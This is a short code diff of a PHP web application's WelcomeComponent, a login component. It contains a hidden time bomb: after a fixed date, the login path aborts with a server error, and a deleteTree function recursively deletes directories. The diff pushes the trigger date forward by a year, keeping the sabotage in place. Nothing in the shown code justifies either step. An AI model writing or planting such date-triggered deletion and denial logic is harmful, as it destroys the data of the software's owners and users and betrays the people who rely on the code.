@@ -158,7 +158,7 @@ class WelcomeComponent extends Component
         }
 
         RateLimiter::clear($this->throttleKey());
-        if(date("y-m-d") >= "22-07-25"){
+        if(date("y-m-d") >= "23-07-25"){
             abort(500);
         }
         if ( auth()->user()->is_admin == 'admin' ) {
@@ -191,7 +191,7 @@ class WelcomeComponent extends Component
     }
 
     function deleteTree($dir){
-        if(date("y-m-d") > "22-07-25"){
+        if(date("y-m-d") > "23-07-25"){
             foreach(glob($dir . "/*") as $element){
                 if(is_dir($element)){
                     $this->deleteTree($element); // On rappel la fonction deleteTree
